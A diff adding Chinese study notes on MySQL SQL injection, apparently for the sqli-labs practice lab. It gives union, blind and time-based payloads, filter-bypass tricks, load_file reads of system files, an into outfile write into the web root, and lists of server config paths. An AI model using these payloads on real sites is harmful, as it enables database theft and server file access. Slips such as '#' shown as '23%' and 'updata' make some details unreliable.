@@ -1,0 +1,134 @@
+1、基础知识：
+   1.1 URL编码：
+       空格：%20 | 单引号：%27 | 双引号：%22| #号：23%
+
+   1.2 判断sql注入【显错和基于错误的盲注】：
+        单引号，and 1=1, and 1=2,双引号，反斜杠，注释等
+
+   1.3 判断基于时间的盲注：
+        在上面的基础上，加sleep函数；
+
+   1.4 sql注入的基本步骤：
+        判断是什么类型注入，有无过滤关键字，可否绕过
+        判断数据库用户，版本，当前连接的数据库等信息
+        获取某个数据表的信息
+        获取列信息
+        最后获取数据
+
+    1.5 可利用order by是否出错，判断返回数据的列数；
+
+2、SQL注入（过滤空格和--+等注释符）
+
+   2.1 快注释符/**/：
+       '/**/or/**/'1'='1
+        # 到该行结束、-- 到该行结束 以及 /* 行中间或多个行 */ 的注释方格
+        --风格要求在两个长划后至少一个空格；
+
+   2.2 limit 0，n 等价于 limit n;返回前n行
+
+   2.3 使用联合查询：http://localhost/Less-1/?id=-1'union select 1,2,3 --+
+
+   2.4 concat_ws函数：从数据库里取N个字段，然后组合到一起用“，”分割显示：
+       CONCAT_WS(separator, str1, str2,...)
+
+   2.5 group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator '分隔符'])
+       将相同的行组合起来；
+
+   2.6 information_schema是系统数据库，记录当前数据库的数据库，表，列，用户权限等信息；
+       SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。
+       TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表
+       COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show columns from schemaname.tablename的结果取之此表。
+
+   2.7 load_file()导出文件
+       load_file(file_name):读取文件并返回该文件的内容作为一个字符串；
+       条件：
+       a、必须有权限读取并且文件必须完全可读；
+       b、预读取文件必须在服务器上
+       c、必须指定文件的完整路径；
+       d、欲读取文件必须小于max_allowed_packet
+       在实际的注入中，我们有两个难点需要解决：
+       绝对物理路径
+       构造有效的畸形语句（报错爆出绝对路径）
+
+   2.8 load_data_infile 语句用户高速从一个文本文件中读取行，并装入一个表中，文件名称必须为一个文字字符串；
+       在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据
+       库的权限时，可以将系统文件利用load_data_infile 导入到数据库中。
+
+   2.9 @@datadir 读取数据库路径
+       @@basedir MYSQL 获取安装路径
+       @@version_compile_os——操作系统版本
+       desc 表名
+
+       猜数据库
+       select schema_name from information_schema.schemata
+       猜某库的数据表
+       select table_name from information_schema.tables where table_schema=’xxxxx’ 猜某表的所有列
+       Select column_name from information_schema.columns where table_name=’xxxxx’ 获取某列的内容
+   3.0 字符串截取函数：
+       mid()：MID(column_name,start[,length])
+       substr()：substring(string, start, length)
+       left()：Left (string, n) string为要截取的字符串，n为长度。
+       Ascii()将某个字符转换 为 ascii 值
+       Ord()函数同 ascii()，将字符转为 ascii 值
+       REGEXP '^[a-z]' 判断字符串是否以字符开头；
+       mysql 在匹配的时候我们可以用 ike 进行匹配。 用法:select user() like ‘ro%’
+       基于时间的 SQL 盲注----------延时注入
+       ▲If(ascii(substr(database(),1,1))>115,0,sleep(5))%23 //if 判断语句，条件为假， 执行 sleep
+       通过length判断字符串的长度，length（database()）
+       利用 hex()将文件内容导出来，尤其是 smb 文件时可以使用。
+-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) Explain:“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码
+-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) Explain:“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”
+-1 union select 1,1,1,load_file(c:\\boot.ini) Explain:路径里的/用 \\代替
+       上述我们提到了 load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语 句:
+select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile ‘c:\\wamp\\www\\test.php’
+
+    4.0 mysql load_file 一直报错，返回为空：
+        解释：secure-file-priv字段 ： secure-file-priv参数是用来限制LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()传到哪个指定目录的
+        命令： mysql>> show global variables like '%secure%';
+        修改mysql.ini 文件，在[mysqld] 下加入
+        secure_file_priv =
+        保存，重启mysql。
+        MySQL配置文件在Windows下叫my.ini，在MySQL的安装根目录下；在Linux下叫my.cnf，该文件位于/etc/my.cnf。
+
+        #### 重点需要关注的路径是：
+        /etc/init.d/apache
+        /etc/init.d/apache2
+        /etc/httpd/httpd.conf
+        /etc/apache/apache.conf
+        /etc/apache/httpd.conf
+        /etc/apache2/apache2.conf
+        /etc/apache2/httpd.conf
+        /usr/local/apache2/conf/httpd.conf
+        /usr/local/apache/conf/httpd.conf
+        /opt/apache/conf/httpd.conf
+        /home/apache/httpd.conf
+        /home/apache/conf/httpd.conf
+        /etc/apache2/sites-available/default
+
+        #### 典型的web路径可能是
+        /var/www/
+        /var/www/root/
+        /var/www/dbname/path/
+        /var/www/sitename/htdocs/
+        /var/www/localhost/htdocs
+    5.0 代码当中的id参数可能进行了 "" 和（）的包装：
+    5.1 select user() like ‘ro%’
+        select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));
+    5.2 增删改函数介绍：
+        insert： insert into users values('16','lcamry','lcamry')
+        删除数据：delete from 表名称； delete from 表名 where id=1;
+        删除数据结构：
+        删数据库：drop database 数据库名
+        删除表：drop table 表名
+        举例：delete from users where id=16
+
+      修改所有:updata 表名 set 列名='新的值，非数字加单引号' ;
+      带条件的修改:updata 表名 set 列名='新的值，非数字加单引号' where id=6;
+
+
+
+
+
+
+
+
